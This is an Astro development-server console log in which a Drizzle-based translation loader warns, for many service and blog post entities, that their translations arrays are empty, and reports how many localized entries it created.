[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-33fb5d39 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-35db7427 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d5a4adf has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3324e589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3dbba740 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4f84b975 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c6bd8108 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6e434fad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4445fe7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-210de9b1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7774cf90 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dc7ba910 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-394f1543 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-52a7de43 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bfaab9c6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-725a5050 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db84c061 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f637349 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9895c9db has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f6c6f302 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-773f0211 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6c6267cd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d525a37b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47085c49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6fdf587a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-aa465471 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-34efb0dc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c1421460 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1a0b4cb0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9531d171 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b7f4d73a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7f7ca00 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5bbf47fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8e054462 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a01cf796 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7aaf63f5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4c3f3986 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98e12337 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2c394312 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d99e5924 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5e5fa063 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-a209cf34 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ebde45c8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b902dd5e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6bd4a782 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18ca384f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c16b8687 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b9f0a49e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d439c329 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acd54078 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b5252eff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-895714b0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b4d5ca49 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d207bac7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fae34b96 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5248e68e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39e22a61 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b6dea38b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-76b83851 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b58ee3b2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-afd81398 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e7c73a7f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-663a4445 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-960a3a6f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-90f2c4c9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-59fe6d1d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-db4f9df2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f889093e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-45012c0c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-be30a165 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b151570e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-04c22692 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-718eb0cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-106f3a7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8134bd48 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7f707bea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7fd85cae has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7b5fad44 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6b53607c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4a41bde has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b670fb19 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-037f6f0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-befe1f2c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-cf49f35d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-786371d0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d50fda7c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ffbc9923 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13446ffe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18e50657 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-15e2a589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d5304933 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dbd0a284 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b44634f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-740e7a11 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-728293f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7890a594 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5c8b291f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-522ed44d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-869af36d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d413dd8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38b50d5d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47528800 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-21cf0b9a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f81acf1a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f3ddeab5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-120d5cac has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2d3ff5a3 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-88ebbd55 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5fed9429 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1066ee9f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1e5b258b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-374f73f0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c13580f2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b41de161 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d20767f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13017b6d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4fa98cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-58c974ff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acf1541e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38d95f75 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6a80558 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39536420 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ec51a1d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-83c379d1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-198755b4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d1fc560 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2859c74b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c37c2433 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3ad7e563 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2368a3a2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-0a631f1e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98339492 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6cc6d20 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-17ea2aad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f544f37 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ad4b1452 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1beb50d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-257c96da has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bf93e13f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-69be50ea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-11e90d7b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d26859a0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-44ebf015 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d81e3f7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-10281057 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4dadbcc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4fc5c4de has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7443bbd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e34a43d2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9216e86e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e5ab8d0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-655d9b87 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1dd4e1fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d6eceb9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-41579eef has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:25:52[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 13 localized entries in Astro Content Layer.
[2m20:25:52[22m [34m[content][39m Synced content

[42m[1m astro [22m[49m [32mv5.18.0[39m [2mready in[22m 14349 [2mms[22m

[2mÔöâ[22m Local    [36mhttp://localhost:4321/[39m
[2mÔöâ[22m Network  [2muse --host to expose[22m

[2m20:25:52[22m [32mwatching for file changes...[39m
[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒøá´©Å  run anywhere with `dotenvx run -- yourcommand`
[2m20:25:56[22m [34m[content][39m Syncing content
[2m20:25:56[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:25:56[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:25:56[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 39 parent entities.
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-ef3f9808 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-3d0f20d6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-13267693 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-f0ff1376 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-9bb2241b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-153bc25a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-829b3c9d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-75b7467c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-4d7685e6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1974855c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-aec14411 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1aa84786 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:56[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-cb8cc996 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:25:56[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 60 localized entries in Astro Content Layer.
[2m20:25:56[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 164 parent entities.
